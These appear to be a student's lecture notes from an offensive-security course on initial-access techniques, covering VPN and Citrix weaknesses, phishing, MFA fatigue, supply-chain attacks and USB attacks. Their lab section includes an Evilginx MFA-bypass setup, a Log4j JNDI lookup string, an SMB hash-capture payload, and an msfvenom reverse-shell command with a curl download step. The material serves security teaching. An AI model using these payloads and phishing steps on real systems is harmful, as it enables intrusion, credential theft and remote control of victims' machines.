


  

of 66

                     Automatic Zoom                     Actual Size                     Page Fit                     Page Width                     110%                     50%                     75%                     100%                     125%                     150%                     200%                     300%                     400%                   

Initial  
Access Execution  
Persistence  
Phase 2: Exploitation  
Defense  
Evasion

# Initial Access

What is it?  
Techniques that allow attackers to gain a foothold within your environment or  
accounts. Some common techniques are:  
● External Remote Services  
● Social Engineering  
● Cloud accounts (and synchronization to local accounts)  
● Hardware Additions  
● Supply Chain Attacks  
● Removable Media

## Remote Working  

Given the rise of remote working, most organizations use a VPN or some sort of  
remote working software to allow employees to work from home. Though we  
do see the return of many employees to office now, remote-working  
infrastructure still exists.  
● Open facing RDP or VNC (bad news)  
● VPN  
● Sophisticated remote software (Citrix)

VPNs  
A classic method for a remote worker to reach internal resources. However,  
where before an attacker would have to be physically in an office space or  
compromise an internal resource to gain access to an internal network, they can  
place their own machine with malicious software on a network if they can  
compromise a VPN. This opens the possibility of breaches from anywhere in the  
world. Some common issues with VPNs are:  
● Old or misconfigured protocols (PPTP, IKE with aggressive)  
● No MFA  
● No lockout policy  
● No device control

VPNs - Old and misconfigured protocols  
PPTP - Uses MS-Chapv2 - old protocol that discloses the username in plaintext  
and can easily be cracked for Active Directory credentials. This attack works  
well if you spoof a WiFi network and someone connects to your WiFi and tries  
to access their PPTP VPN. This VPN type is easy to set up in AD.  
https://www.youtube.com/watch?v=lm7Cuktpnb4

VPNs - Old and misconfigured protocols  
IKE with Aggressive Mode - IKE needs a pre shared key (PSK) and  
username/password to authenticate. Aggressive mode (default) allows anyone  
to get PSK hash and try to crack it. Then an attacker just needs credentials to  
access. This VPN type is easy to set up and very common.

VPNs - The Correct  
● Use an SSL VPN (comes with most firewalls) with MFA  
● Enforce IP or user lockout  
● MAC filtering  
● Country IP filtering 

Other Remote Services (Citrix)  
● Let’s you remote into a server (similar to RDP) through your browser  
● Can authenticate with M365 or other SSO  
● Everyone uses the same jumpbox  
● Citrix Server handles sessions (Each user’s desktop, documents,  
downloads, etc.)  
Jumpbox  : What you use to get into the network. Everyone has a session, it connects over SMB to the server, and then you gain access to the internal network. If misconfigured, you can see everyone else's documents. Sometimes the **JumpBox** has too many privileges. You can read/write files, etc. 
Citrix Server  
User  
Cloud Infrastructure (File  
servers, application  
servers, etc.)  
Authentication  
HTTPS  
SMB  
All sorts of  
things

Issues with Citrix  
If Citrix is improperly configured (default) to access Azure Active Directory  
(AAD), users can see the documents, downloads, etc. of all other users by  
mounting the Citrix remote folder for each user’s session. This is because every  
AD user needs read/write access to that folder, or their documents will never be  
saved. However, the default configuration is to allow those permissions to the  
entire remote drive, not just the user’s folders.  
Also, you can’t print with Citrix. You have to take the file off the AAD  
environment onto your local machine and print it at home. This is really bad for  
controlling sensitive data, as a business need allows sensitive data to be placed  
onto wherever. Given most attacks are about exfiltrating or messing with data,  
you need to have control over where your data is.

Social Engineering  
Social engineering is the most common  
way for threat actors to access your  
environment or your data. It can be seen  
as the use of deception to trick people  
into divulging sensitive information.  
● Email phishing (spear, whale, etc.)  
● Vishing  
● Smishing  
● Scareware and scare emails : 

	Very common on phones. What they want you to do is to click the link, and donwload their malware. 




Case Study - Twitter  
On July 15, 2020 about 130 high-profile accounts were compromised and made tweets like the  
following.

What Happened  
"The attackers successfully manipulated a small number of employees and used their credentials  
to access Twitter's internal systems, including getting through our two-factor protections. As of  
now, we know that they accessed tools only available to our internal support teams."  
Attackers were able to social engineer to breach credentials and bypass MFA of low-level  
employees. They then used the employees Slack accounts to social engineer employees who had  
access to admin tools. From there, attackers used admin tools to gain access to the Twitter accounts. 


They got into the network via Slack, and then they did further Social Engineering inside Slack. They are more trusted this way. With the phishing attack, there was a sense of urgency (*use it for the assignment*). 


MFA is not perfect, and you need other layers of security. There was no coding involved at all (except emails), they used Slack which is the organization's trusted tool. 

You do not need a lot of experience to complete, and it does alot of damage


Why did this work so well?  
1. The timing - This was during the peak of COVID, so some people thought that the tweets  
were legitimate COVID relief programs (sense of urgency with the 30 minute limit)  
2. Business Email COmpromise (BEC) - If you can compromise an email (or Slack) account, you  
have trust - the most powerful tool for social engineering.  
3. MFA is not perfect - It can be bypassed and is not the end-all-be-all security layer  
4. The attack was simple - No coding, no C2s, just the use of legitimate tools Twitter used.  
MFA fatigue - When an attacker has someone’s credentials, they constantly login and send MFA  
requests to the victim in hopes they accept the request. Microsoft has put defenses against this by  
making you type a number into the MFA authenticator.

## MFA Fatigue


You spam the user with MFA requests. People will get fed up and just approve it,


The Microsoft Authenticator requests a number. This is to protect against MFA Fatigue. You can get through it with MFA Bypass.



### Case Study - Weird Email I Got  
Received this email on Monday. It looks like it went to all  
staff judging by the recipient list being in alphabetical  
order (attacker didn’t know what BCC is)


How Attack Works (Possibility 1)  
1. Go to video on Youtube  
2. Click on some crypto link in the comments ( likely !)
   

How Attack Works (Possibility 2)  
This email is so preposterous you have to respond. This establishes an email chain, and more  
trust when the attacker replies with the malicious link.  
Youtube Redirection ( YouTube can redirect, which the attacker potentially set it up to re-link to their own malicious link). You use a trusted website to an untrusted website. Watch out for redirects!



### Second Email : a *Norton Receipt*


There is no link in the email. They will try to get a response from you, due to " ... in the next 24 hours ...". Then they establish trust. 



## AI in Social Engineering 


Rise in AI and ChatGPT. You can ask ChatGPT to write you a Phishing Email. 

https://www.youtube.com/watch?v=pJZYd_65xs4

You see alot of ransom scares. There is enough from social media to clone someone's voice from.

To combat this, the client of a bank can choose not to conduct any transactions over the phone. 

From video : 

Voice cloning to scam victims. A daughter's voice was copied, and a scenario the scammer did is to make her think he kidnapped her daughter. She fell for it. The individual asked for $5000. Americans lost billions due to fraud. The older adults are much more prone to it. 

They cloned the anchor's name, and then called his mother. 


Bryan did an example where he asked a colleague to read from "Pride and Prejudice", and was able to clone their voice that way. 


### Cloud Accounts  
https://www.cisco.com/c/en_au/solutions/hybrid-cloud/2022-trends-report-cte.html#~summary

Some organizations are entirely cloud-based. Private clouds can range in configurations from completely cloud based to hybrid-clouds.

A mix of public cloud infrastructure (M365, AWS, etc.),

private cloud (Azure Active Directory,  VPN, CITRIX) 

on-premise infrastructure (Active Directory)
# Hardware Additions



Hardware additions involve placing an external device within a network to gain access to the  
network or information about the network. Most offices are littered with Ethernet ports,  
especially in meeting rooms, so hardware is easy to find.  
● Wireless access points  
● Network taps  
● Computers (Raspberry pis)


Bryan walked in to a room where the server was out in the open. Sometimes you can place little plastic attachments to the switch. They had no MAC filtering, or rogue device detection. The RaspberryPi is needed to run a reverse shell. 

GO to meeting room, plug a raspberry pi to a jack, and go to the parking lot and access the organization's network via WIFI ( via the reverse shell)


hint : if you know the organization is a client of Bell, you can dress in the Bell uniform and walk into the door. 

Academia is very prone to this...


# Supply Chain Attacks



A lot of organizations rely on external tools. If the external tool is compromised, it can be a way through to the organization's network 


## NPM 


NPM  
● Package manager for JavaScript  
● Used to install packages for Node.js applications  
● Many applications rely on third party NPM packages  
“1,300 Malicious Packages Found in Popular npm JavaScript Package Manager”  
https://www.securityweek.com/1300-malicious-packages-found-popular-npm-javascript-packag  
e-manager/  
In 2022, 1300 packages used to steal data, crypto and running botnets were found. Each package  
had a similar name to a widely-used one,. Hoping someone would accidently install something  
from a typo and not notice.



On NPM, people make a version of a NodeJS package, and make the name a typo of the real thing. 


NPM Colors is a very popular library, and alot of people use it. The developer made a strange commit, where if you are trying to download it from a Russian IP, the developer would add the US flag and say 'Liberty' and add a Heart Emoji. The developer themselves made a *supply chain attack*!
This commit infinitely prints Liberty And then a bunch of gibberish. This bricked all applications  
relying on it.

Source Code Review before updating! 



### Log4j - Oversight  
Log4J is another example of a code repository causing the vulnerabilities of many systems. It is an  
open-source logging framework designed to log messages with software. It wasn’t international,  
but a bug was discovered where one could make requests to an LDAP server through messages of  
You can trick it to make an LDAP request to a malicious Log4j server. 


a Java application that uses Log4j.  
jndi:ldap://xxx.dnslog.cn/a  
Attacker Java App Malicious  
LDAP  
Malicious  
Text  
LDAP  
Lookup  
Malicious  
Payload





## SolarWinds 




SolarWinds  
A SaaS company for IT management and  
administration. The attack took advantage  
of Orion, anm IT management and  
performance monitoring solution.  
Evidence says that as early as October  
2019, attackers inserted malicious code  
into a DLL file that orion used. The file was  
digitally signed by SolarWinds, so it was  
before the final product was built.  
https://www.microsoft.com/en-us/security/blog/2020/12/18/analyzing-solorigat  
e-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-mi  
crosoft-defender-helps-protect/


Attackers broke into Solarwinds, and the attacker changed the source code of a .dll file and added a backdoor. People who used Orion can a back door into their system. The .DLL evaded AntiVirus. It was not a normal reverse shell. They made a compiler, where it processed C# Code, and compile it in memory. For each command sent, it was a different C# code. A lot of malware is done through many stages to avoid antivirus. Antiviruses sandboxes the malicious package. If you sandbox C# code, it would nto do anything. 



They called the function OrionImprovement, where it checked if it was active, and if not active activated itself. A lot of people were affected. Organizations who used Solarwinds got affected automatically if they used Orion. 



Supply Chain Attacks happen. SOC 2 checkup when using a SaaS from a third-party.




Lessons  
● Perform code review - easier said than done  
● Have active monitoring of your systems  
● Implement multiple security layers (SIEM, EndpointDetectionResponse, etc.)  
● Have an IR Plan


### Removable Media


A lot of people leave their pcs open. 

One good way is a RubberDucky. We will emulate them with python. It acts like a keyboard, you pre-load a script on it, where you run PowerShell and run a backdoor. 


There are two types of keyloggers : 

Software 
Hardware


User Access Control : It is the prompt by Windows that asks for confirmation, and software will stop the process to ask 


Hardware : it will get any keystroke, independent of UAC



KeyLogger  
● Place between keyboard and PC  
● Acts as a proxy  
● Can record and transmit keystrokes  
● Not very obvious for victim to notice  
● Software keyloggers also exist



### RubberDucky

Rubber Ducky  
● Emulates a keyboard  
● Can type keystrokes really quick  
when plugged into PC  
● Hard to detect because it  
Is recognized as a keyboard

You can check remotely via SSH if someone attached it, or its status

### Removable Media  
● Need physical access to victim  
○ USB drop attacks  
○ https://www.blackhat.com/docs/us-16/materials/us-16-Bursztein-Does-Dropping-USB-Drives-In-Parking-Lots-And-Other-Places-Really-Work.pdf

People are curious!





# Labwork



## MFA Bypass


When we signed in to DVWA , we proved we logged in 


We have a victim to be enticed to --> visit a proxy --> he used M365 --> it goes through the proxy to M365 , buy a domain , set up SSL certificates. It will look like M365, they log in , the attacker gets the username/password, it will ask them for MFA, and the response is a session token. Once we have the session token, we get a cookie-editor for Firefox to edit it/view it. 



Methodology : 

1. Install Go : 
   
   sudo apt install golang-go 

2. Clone Evilginx :




Place the 0365.yaml file in the Phislets folder

([An0nUD4Y/Evilginx2-Phishlets: Evilginx3 Phishlets version (0.2.3 & above) Only For Testing/Learning Purposes (github.com)](https://github.com/An0nUD4Y/Evilginx2-Phishlets))

The Kali Linux vm will be our Proxy Server. 



The cookie editor will be on Firefox too


This exercise will help a ton in our assignment


The host file should be changed to adapt to the victim. The pc when trying to reach a website checks the host file first before the DNS. 

Subdomain in the host file does nto have to be a login. Adapt it in style to the intended destination ( for the victim )



## Exercise - Rubber  Ducky Emulation

Why emulation  

● Rubber duckys are expensive  
● We can use python instead

Results

	whoami 
	desktop-user\beard
	PS C:\Users\beard
	
Getting Hashes  

>[!command]
	# Payloads
>	 shell = "powershell.exe"
>	 payload = "net view \\\\192.168.42.82\\temp"

Hashcat -m 2100

### Instructions 

1. Create a Windows VM from scratch (Windows  
pro or education edition)  
2. Create a local admin user  
a. Turn off Defender AV  
3. Install Python onto the VM  
a. Add python to path  
4. Use msfvenom on Kali to make a  
windows/x64/shell_reverse_tcp exe payload  

	msfvenom -p windows/shell/reverse_tcp  -e x86/shikata_ga_nai LHOST=192.168.126.141 LPORT=12345 -f exe -o ~/REVERSE_SHELL.exe

5. Use python on kali to host a web server  
6. Rewrite the ducky script to use curl to  
download the script to c:\Windows\Temp  
a. -o flag is useful  
b. Will need to run the run_payload function more  
than once  
c. Good to sleep a bit in between commands to  
ensure the payload is downloaded before  
running